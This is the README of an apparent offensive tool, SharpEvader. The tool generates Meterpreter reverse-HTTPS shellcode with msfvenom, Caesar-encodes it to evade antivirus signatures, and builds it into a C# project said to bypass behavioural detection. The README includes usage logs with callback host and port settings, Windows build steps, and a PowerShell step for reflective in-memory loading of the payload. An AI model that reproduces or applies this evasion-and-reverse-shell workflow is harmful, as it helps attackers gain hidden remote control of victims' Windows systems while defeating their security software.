# 🤔 SharpEvader
#### This is a python script which automatically generates `windows/x64/meterpreter/reverse_https` shellcode and caeser encodes it and slaps some Behavioural detection in a c# Project for you to build and run


# ✨ Features
- Automatically generate's `windows/x64/meterpreter/reverse_https` shellcode by borrowing `msfvenom`(What more do you expect, Write an `msfvenom` clone from scratch ??) from your linux host.
- Applies some magic sauce inorder to bypass the Signature Based detection.(The magic sauce is absolutely not Caeser Cipher).
- Generate's a C# Project with the encoded shellcode and some more spells to bypass Behavioural Based Detection.
- Quick, Order your Reverse Shell now Available at an easy installment of $999 each :)
- Powershell Script to generate a reflection ps1 script with the C# executable embedded inside it[Tested as of 1st July 2022].
- Does not use Java !!!
- Owner's or Contributor's of this repo does not take responsibiltes of any damages caused using it or with it, any illegal usage is highly discouraged.


# ⚙️ Requirements
- Python3.7+
- msfvenom or Metasploit Framework
- Powershell on Linux[Optional]


# 🤸 Usage
## To be done on Linux

### Run Sharpevader.py to generate the C# Project
```bash
~/SharpEvader > python3 sharpevader.py
LHOST: 10.10.10.16
LPORT: 9001
[*] Using LHOST as 10.10.10.16 and LPORT as 9001
[*] Generating msfvenom shellcode...
[+] MSFVenom Shellcode generation successful
[+] Encoded shellcode with caeser cipher with +7 as Key
[*] Deleting the msf_shellcode.hex file as no one wants it anymore
[*] Baking the fresh Shellcode into a C# project for compiling
[+] Baking successfull please compile the C# Project using Microsoft Visual Studio on Windows
[+] Happy Evasion using rev_exe_01072022021313AM!!!
```

---

### The C# project directory would be placed inside the output directory with name rev_exe_[timestamp]
```bash
~/SharpEvader/output/rev_exe_01072022021313AM > ls -l
total 28
-rwxr-xr-x 1 root root  189 Jul  1 02:13 App.config
drwxr-xr-x 2 root root 4096 Jul  1 02:13 bin
-rwxr-xr-x 1 root root 4942 Jul  1 02:13 Program.cs
drwxr-xr-x 2 root root 4096 Jul  1 02:13 Properties
-rwxr-xr-x 1 root root 3189 Jul  1 02:13 rev.csproj
-rwxr-xr-x 1 root root  892 Jul  1 02:13 rev.sln
```

## To be done on Windows
- Transfer the rev_exe_[timestamp] from the output directory and launch `rev.sln` using `Visual Studio`.
- Build the Project using the `Release` and `x64` build configuration.
- Voila !!! The built C# executable would be available in the `rev_exe_[timestamp]/bin/x64/Release/rev.exe`

---

## [Optional] Can be done in Windows/Linux with powershell available
- Execute the `reflection_pwsh_gen.ps1` supplying the `-File` argument as the absolute path to the `rev.exe`
- This would generate a `rev.ps1` which would be consist the C# binary embedded into a ps1 script which would be reflectively loaded in the memory.

---

```bash
~/SharpEvader > pwsh reflection_pwsh_gen.ps1 -File ~/SharpEvader/output/rev_exe_01072022021313AM/bin/x64/Release/rev.exe
[+] Written the C# Embedded Reflection Reverse Shell into rev.ps1
```
# ‼️ Disclaimer

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.